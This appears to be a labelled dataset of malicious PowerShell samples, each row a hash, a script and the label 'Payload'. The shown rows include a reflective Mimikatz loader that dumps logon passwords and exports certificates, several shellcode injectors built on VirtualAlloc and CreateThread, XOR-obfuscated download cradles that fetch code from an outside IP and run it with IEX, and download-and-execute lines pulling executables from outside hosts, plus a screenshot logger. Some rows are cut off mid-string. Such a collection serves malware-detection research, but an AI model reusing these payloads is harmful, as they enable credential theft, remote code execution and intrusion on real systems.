            $Processor = $Processors
        }

        if ( ( $Processor.AddressWidth) -ne (([System.IntPtr]::Size)*8) )
        {
            Write-Verbose ( ""Architecture: "" + $Processor.AddressWidth + "" Process: "" + ([System.IntPtr]::Size * 8))
            Write-Error ""PowerShell architecture (32bit/64bit) doesn't match OS architecture. 64bit PS must be used on a 64bit OS."" -ErrorAction Stop
        }

        
        if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8)
        {
            [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes64)
        }
        else
        {
            [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes32)
        }
        $PEBytes[0] = 0
        $PEBytes[1] = 0
		$PEHandle = [IntPtr]::Zero
		if ($RemoteProcHandle -eq [IntPtr]::Zero)
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs
		}
		else
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle
		}
		if ($PELoadedInfo -eq [IntPtr]::Zero)
		{
			Throw ""Unable to load PE, handle returned is NULL""
		}
		
		$PEHandle = $PELoadedInfo[0]
		$RemotePEHandle = $PELoadedInfo[1] 
		
		
		
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		if (($PEInfo.FileType -ieq ""DLL"") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
		{
			
			
			
                    Write-Verbose ""Calling function with WString return type""
				    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName ""powershell_reflective_mimikatz""
				    if ($WStringFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw ""Couldn't find function address.""
				    }
				    $WStringFuncDelegate = Get-DelegateType @([IntPtr]) ([IntPtr])
				    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
                    $WStringInput = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArgs)
				    [IntPtr]$OutputPtr = $WStringFunc.Invoke($WStringInput)
                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($WStringInput)
				    if ($OutputPtr -eq [IntPtr]::Zero)
				    {
				    	Throw ""Unable to get output, Output Ptr is NULL""
				    }
				    else
				    {
				        $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
				        Write-Output $Output
				        $Win32Functions.LocalFree.Invoke($OutputPtr);
				    }
			
			
			
		}
		
		elseif (($PEInfo.FileType -ieq ""DLL"") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName ""VoidFunc""
			if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
			{
				Throw ""VoidFunc couldn't be found in the DLL""
			}
			
			$VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
			$VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
			
			
			$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
		}
		
		
		if ($RemoteProcHandle -eq [IntPtr]::Zero)
		{
			Invoke-MemoryFreeLibrary -PEHandle $PEHandle
		}
		else
		{
			
			$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
			if ($Success -eq $false)
			{
				Write-Warning ""Unable to call VirtualFree on the PE's memory. Continuing anyways."" -WarningAction Continue
			}
		}
		
		Write-Verbose ""Done!""
	}

	Main
}


Function Main
{
	if (($PSCmdlet.MyInvocation.BoundParameters[""Debug""] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters[""Debug""].IsPresent)
	{
		$DebugPreference  = ""Continue""
	}
	
	Write-Verbose ""PowerShell ProcessID: $PID""
	

	if ($PsCmdlet.ParameterSetName -ieq ""DumpCreds"")
	{
		$ExeArgs = ""sekurlsa::logonpasswords exit""
	}
    elseif ($PsCmdlet.ParameterSetName -ieq ""DumpCerts"")
    {
        $ExeArgs = ""crypto::cng crypto::capi `""crypto::certificates /export`"" `""crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE`"" exit""
    }
    else
    {
        $ExeArgs = $Command
    }

    [System.IO.Directory]::SetCurrentDirectory($pwd)

	
    $PEBytes64 = ""
    $PEBytes32 = ""
""

	if ($ComputerName -eq $null -or $ComputerName -imatch ""^\\s*$"")
	{
		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, ""Void"", 0, """", $ExeArgs)
	}
	else
	{
		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, ""Void"", 0, """", $ExeArgs) -ComputerName $ComputerName
	}
}

Main
}
",Payload
13c846b636796c53c4748a53c00bedc09ea90cc322cff7da6c355f8bad0cbcdc,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x6e,0x65,0x74,0x00,0x68,0x77,0x69,0x6e,0x69,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0x31,0xdb,0x53,0x53,0x53,0x53,0x53,0x68,0x3a,0x56,0x79,0xa7,0xff,0xd5,0x53,0x53,0x6a,0x03,0x53,0x53,0x68,0x70,0x17,0x00,0x00,0xe8,0x78,0x00,0x00,0x00,0x2f,0x35,0x58,0x30,0x54,0x4b,0x00,0x50,0x68,0x57,0x89,0x9f,0xc6,0xff,0xd5,0x89,0xc6,0x53,0x68,0x00,0x02,0x60,0x84,0x53,0x53,0x53,0x57,0x53,0x56,0x68,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x96,0x6a,0x0a,0x5f,0x53,0x53,0x53,0x53,0x56,0x68,0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x0a,0x4f,0x75,0xed,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x68,0x00,0x00,0x40,0x00,0x53,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x53,0x89,0xe7,0x57,0x68,0x00,0x20,0x00,0x00,0x53,0x56,0x68,0x12,0x96,0x89,0xe2,0xff,0xd5,0x85,0xc0,0x74,0xcd,0x8b,0x07,0x01,0xc3,0x85,0xc0,0x75,0xe5,0x58,0xc3,0x5f,0xe8,0x89,0xff,0xff,0xff,0x31,0x39,0x32,0x2e,0x31,0x36,0x38,0x2e,0x30,0x2e,0x39,0x00;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
72924260546d538a33437a680c60dc1a7f15f3c598366e476bc066d9c08b0821,"
$wC=New-ObjEcT SYsTEM.NeT.WEBClIENT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$Wc.HeADers.AdD('User-Agent',$u);$WC.ProXY = [SYsTem.NeT.WEBREQuEST]::DEFAuLtWebPRoxY;$Wc.Proxy.CREdenTialS = [SysTEM.NET.CredeNTIAlCache]::DEfaUlTNeTWOrkCRedENTials;$K='UO_?23+}DPC^cQzg@jlSH6!Iv*RMk.px';$i=0;[ChAr[]]$b=([CHAR[]]($wc.DownLoADStRinG(""https://66.192.70.38:80/index.asp"")))|%{$_-BXOr$k[$i++%$k.LEngTH]};IEX ($b-JOin'')

",Payload
2214c025d39aab62fa3cee32b083cc3758f66ae1951e163e60afb21893a1687c,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x05,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
a527e455d4cabf8e860a11d9d29817d4d18ba088a333bd41c59449995a4af502,"function Get-HttpStatus
{


    [CmdletBinding()] Param(
        [Parameter(Mandatory = $True)]
        [String]
        $Target,

        [String]
        [ValidateNotNullOrEmpty()]
        $Path = '.\\Dictionaries\\admin.txt',

        [Int]
        $Port,

        [Switch]
        $UseSSL
    )
    
    if (Test-Path $Path) {
    
        if ($UseSSL -and $Port -eq 0) {
            
            $Port = 443
        } elseif ($Port -eq 0) {
            
            $Port = 80
        }
    
        $TcpConnection = New-Object System.Net.Sockets.TcpClient
        Write-Verbose ""Path Test Succeeded - Testing Connectivity""
        
        try {
            
            $TcpConnection.Connect($Target, $Port)
        } catch {
            Write-Error ""Connection Test Failed - Check Target""
            $Tcpconnection.Close()
            Return 
        }
        
        $Tcpconnection.Close()
    } else {
           Write-Error ""Path Test Failed - Check Dictionary Path""
           Return
    }
    
    if ($UseSSL) {
        $SSL = 's'
        
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }
    } else {
        $SSL = ''
    }
    
    if (($Port -eq 80) -or ($Port -eq 443)) {
        $PortNum = ''
    } else {
        $PortNum = "":$Port""
    }
    
    
    foreach ($Item in Get-Content $Path) {

        $WebTarget = ""http$($SSL)://$($Target)$($PortNum)/$($Item)""
        $URI = New-Object Uri($WebTarget)

        try {
            $WebRequest = [System.Net.WebRequest]::Create($URI)
            $WebResponse = $WebRequest.GetResponse()
            $WebStatus = $WebResponse.StatusCode
            $ResultObject += $ScanObject
            $WebResponse.Close()
        } catch {
            $WebStatus = $Error[0].Exception.InnerException.Response.StatusCode
            
            if ($WebStatus -eq $null) {
                
                
                $WebStatus = $Error[0].Exception.InnerException.Status
            }
        } 
        
        $Result = @{ Status = $WebStatus;
                     URL = $WebTarget}
        
        $ScanObject = New-Object -TypeName PSObject -Property $Result
        
        Write-Output $ScanObject
        
    }
}
",Payload
22ac501edeefbac0b2154d27ff550794807c1c77245dc2a465f67469b050914c,"function Get-TimedScreenshot
{


    [CmdletBinding()] Param(
        [Parameter(Mandatory=$True)]             
        [ValidateScript({Test-Path -Path $_ })]
        [String] $Path, 

        [Parameter(Mandatory=$True)]             
        [Int32] $Interval,

        [Parameter(Mandatory=$True)]             
        [String] $EndTime    
    )

    
    Function Get-Screenshot {
       $ScreenBounds = [Windows.Forms.SystemInformation]::VirtualScreen

       $VideoController = Get-WmiObject -Query 'SELECT VideoModeDescription FROM Win32_VideoController'

       if ($VideoController.VideoModeDescription -and $VideoController.VideoModeDescription -match '(?<ScreenWidth>^\\d+) x (?<ScreenHeight>\\d+) x .*$') {
           $Width = [Int] $Matches['ScreenWidth']
           $Height = [Int] $Matches['ScreenHeight']
       } else {
           $ScreenBounds = [Windows.Forms.SystemInformation]::VirtualScreen

           $Width = $ScreenBounds.Width
           $Height = $ScreenBounds.Height
       }

       $Size = New-Object System.Drawing.Size($Width, $Height)
       $Point = New-Object System.Drawing.Point(0, 0)

       $ScreenshotObject = New-Object Drawing.Bitmap $Width, $Height
       $DrawingGraphics = [Drawing.Graphics]::FromImage($ScreenshotObject)
       $DrawingGraphics.CopyFromScreen($Point, [Drawing.Point]::Empty, $Size)
       $DrawingGraphics.Dispose()
       $ScreenshotObject.Save($FilePath)
       $ScreenshotObject.Dispose()
    }

    Try {
            
        
        Add-Type -Assembly System.Windows.Forms            

        Do {
            
            $Time = (Get-Date)
            
            [String] $FileName = ""$($Time.Month)""
            $FileName += '-'
            $FileName += ""$($Time.Day)"" 
            $FileName += '-'
            $FileName += ""$($Time.Year)""
            $FileName += '-'
            $FileName += ""$($Time.Hour)""
            $FileName += '-'
            $FileName += ""$($Time.Minute)""
            $FileName += '-'
            $FileName += ""$($Time.Second)""
            $FileName += '.png'
            
            
            [String] $FilePath = (Join-Path $Path $FileName)

            
            Get-Screenshot
               
            Write-Verbose ""Saved screenshot to $FilePath. Sleeping for $Interval seconds""

            Start-Sleep -Seconds $Interval
        }

        
        While ((Get-Date -Format HH:mm) -lt $EndTime)
    }

    Catch {Write-Error $Error[0].ToString() + $Error[0].InvocationInfo.PositionMessage}
}
",Payload
60b2eff8b8302ddab0a5dc44a6f019bc9235d33682d5c3aabb77cb314f134f6b,"
(New-Object System.Net.WebClient).DownloadFile('http://nikil.tk/i1/iz_001.exe',""$env:TEMP\\iz_001.exe"");Start-Process (""$env:TEMP\\iz_001.exe"")

",Payload
c51140507d7f91df30347e718bbb510977d6cea2f465ccecb2c4bd115e7a3915,"
$1 = '$c = ''[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]p

",Payload
8160cece0440080d5f1a62f95d195ef5f029bece2479f34241cd2f6567f3148a,"
[SYsteM.NeT.ServICePOiNTMANagER]::EXPECT100ConTinUe = 0;$WC=NEw-ObjECT SYSTEM.NEt.WEBCliENT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HeaDERs.ADD('User-Agent',$u);$wC.PROXY = [SyStem.NeT.WEbREqueST]::DeFAulTWEBPRoxy;$WC.PRoxY.CRedeNtiALS = [SYSTEm.Net.CReDeNTIaLCaChE]::DEfAUltNeTwoRKCReDEnTIaLS;$K='E!7y2[}J?CrG/aqH*5WZ4@o^_BYg(

",Payload
51e5c32a8bf7489ef00c0e8086882a27d5e19e67bd0d16f8e7d8f7653f43fc00,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x02,0xe5,0x68,0x02,0x00,0x04,0xd2,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
8148f82de13cb18bd72be10017124a29d5db0232eaefb6917dc0ec71c2cae48e,"
$ZgOB = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $ZgOB -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdd,0xc2,0xd9,0x74,0x24,0xf4,0xba,0xed,0x38,0x19,0x1d,0x5b,0x2b,0xc9,0xb1,0x47,0x83,0xc3,0x04,0x31,0x53,0x14,0x03,0x53,0xf9,0xda,0xec,0xe1,0xe9,0x99,0x0f,0x1a,0xe9,0xfd,0x86,0xff,0xd8,0x3d,0xfc,0x74,0x4a,0x8e,0x76,0xd8,0x66,0x65,0xda,0xc9,0xfd,0x0b,0xf3,0xfe,0xb6,0xa6,0x25,0x30,0x47,0x9a,0x16,0x53,0xcb,0xe1,0x4a,0xb3,0xf2,0x29,0x9f,0xb2,0x33,0x57,0x52,0xe6,0xec,0x13,0xc1,0x17,0x99,0x6e,0xda,0x9c,0xd1,0x7f,0x5a,0x40,0xa1,0x7e,0x4b,0xd7,0xba,0xd8,0x4b,0xd9,0x6f,0x51,0xc2,0xc1,0x6c,0x5c,0x9c,0x7a,0x46,0x2a,0x1f,0xab,0x97,0xd3,0x8c,0x92,0x18,0x26,0xcc,0xd3,0x9e,0xd9,0xbb,0x2d,0xdd,0x64,0xbc,0xe9,0x9c,0xb2,0x49,0xea,0x06,0x30,0xe9,0xd6,0xb7,0x95,0x6c,0x9c,0xbb,0x52,0xfa,0xfa,0xdf,0x65,0x2f,0x71,0xdb,0xee,0xce,0x56,0x6a,0xb4,0xf4,0x72,0x37,0x6e,0x94,0x23,0x9d,0xc1,0xa9,0x34,0x7e,0xbd,0x0f,0x3e,0x92,0xaa,0x3d,0x1d,0xfa,0x1f,0x0c,0x9e,0xfa,0x37,0x07,0xed,0xc8,0x98,0xb3,0x79,0x60,0x50,0x1a,0x7d,0x87,0x4b,0xda,0x11,0x76,0x74,0x1b,0x3b,0xbc,0x20,0x4b,0x53,0x15,0x49,0x00,0xa3,0x9a,0x9c,0xbd,0xa6,0x0c,0xdf,0xea,0xa8,0x1d,0xb7,0xe8,0xaa,0x9f,0xd2,0x64,0x4c,0xcf,0xb2,0x26,0xc1,0xaf,0x62,0x87,0xb1,0x47,0x69,0x08,0xed,0x77,0x92,0xc2,0x86,0x1d,0x7d,0xbb,0xff,0x89,0xe4,0xe6,0x74,0x28,0xe8,0x3c,0xf1,0x6a,0x62,0xb3,0x05,0x24,0x83,0xbe,0x15,0xd0,0x63,0xf5,0x44,0x76,0x7b,0x23,0xe2,0x76,0xe9,0xc8,0xa5,0x21,0x85,0xd2,0x90,0x05,0x0a,0x2c,0xf7,0x1e,0x83,0xb8,0xb8,0x48,0xec,0x2c,0x39,0x88,0xba,0x26,0x39,0xe0,0x1a,0x13,0x6a,0x15,0x65,0x8e,0x1e,0x86,0xf0,0x31,0x77,0x7b,0x52,0x5a,0x75,0xa2,0x94,0xc5,0x86,0x81,0x24,0x39,0x51,0xef,0x52,0x53,0x61;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$w57T=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($w57T.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$w57T,0,0,0);for (;;){Start-sleep 60};

",Payload
0e58274ba5b05102c5ebbda053d6ead91e579748dd2ff12898a97018cb30f63e,"
(New-Object System.Net.WebClient).DownloadFile('http://anonfile.xyz/f/3d0a4fb54941eb10214f3c1a5fb3ed99.exe','fleeble.exe');Start-Process 'fleeble.exe'

",Payload
5ed2ae4d7beea109c67b4e0ada19686f445ed29586ec4acbc0060955edc4f806,"
$rEt = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $rEt -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xd2,0xba,0xe1,0x17,0x4e,0x56,0xd9,0x74,0x24,0xf4,0x5e,0x31,0xc9,0xb1,0x5a,0x31,0x56,0x17,0x03,0x56,0x17,0x83,0x0f,0xeb,0xac,0xa3,0x33,0xfc,0xb3,0x4c,0xcb,0xfd,0xd3,0xc5,0x2e,0xcc,0xd3,0xb2,0x3b,0x7f,0xe4,0xb1,0x69,0x8c,0x8f,0x94,0x99,0x07,0xfd,0x30,0xae,0xa0,0x48,0x67,0x81,0x31,0xe0,0x5b,0x80,0xb1,0xfb,0x8f,0x62,0x8b,0x33,0xc2,0x63,0xcc,0x2e,0x2f,0x31,0x85,0x25,0x82,0xa5,0xa2,0x70,0x1f,0x4e,0xf8,0x95,0x27,0xb3,0x49,0x97,0x06,0x62,0xc1,0xce,0x88,0x85,0x06,0x7b,0x81,0x9d,0x4b,0x46,0x5b,0x16,0xbf,0x3c,0x5a,0xfe,0xf1,0xbd,0xf1,0x3f,0x3e,0x4c,0x0b,0x78,0xf9,0xaf,0x7e,0x70,0xf9,0x52,0x79,0x47,0x83,0x88,0x0c,0x53,0x23,0x5a,0xb6,0xbf,0xd5,0x8f,0x21,0x34,0xd9,0x64,0x25,0x12,0xfe,0x7b,0xea,0x29,0xfa,0xf0,0x0d,0xfd,0x8a,0x43,0x2a,0xd9,0xd7,0x10,0x53,0x78,0xb2,0xf7,0x6c,0x9a,0x1d,0xa7,0xc8,0xd1,0xb0,0xbc,0x60,0xb8,0xdc,0x71,0x49,0x42,0x1d,0x1e,0xda,0x31,0x2f,0x81,0x70,0xdd,0x03,0x4a,0x5f,0x1a,0x63,0x61,0x27,0xb4,0x9a,0x8a,0x58,0x9d,0x58,0xde,0x08,0xb5,0x49,0x5f,0xc3,0x45,0x75,0x8a,0x44,0x15,0xd9,0x65,0x25,0xc5,0x99,0xd5,0xcd,0x0f,0x16,0x09,0xed,0x30,0xfc,0x22,0x06,0x8e,0xff,0x4c,0xd7,0x79,0x65,0x2f,0xb4,0xf6,0x16,0x81,0x49,0x81,0xac,0xb8,0xde,0x5f,0x23,0x26,0x55,0x9f,0xe3,0xf0,0xcd,0xc7,0x4b,0x59,0xb6,0xaf,0x33,0x01,0x1e,0x17,0x9c,0xe9,0xc6,0xff,0x44,0x52,0xaf,0xa7,0x2c,0x3a,0x17,0x0f,0x95,0xe2,0xff,0xf7,0x7d,0x4b,0x58,0x5f,0x26,0x33,0x00,0x07,0x8e,0x9b,0xe8,0xef,0x76,0x44,0x51,0x57,0xdf,0x2c,0x61,0x0f,0x76,0xe4,0x55,0x4f,0x77,0x20,0x1e,0x0f,0x94,0xa1,0x24,0x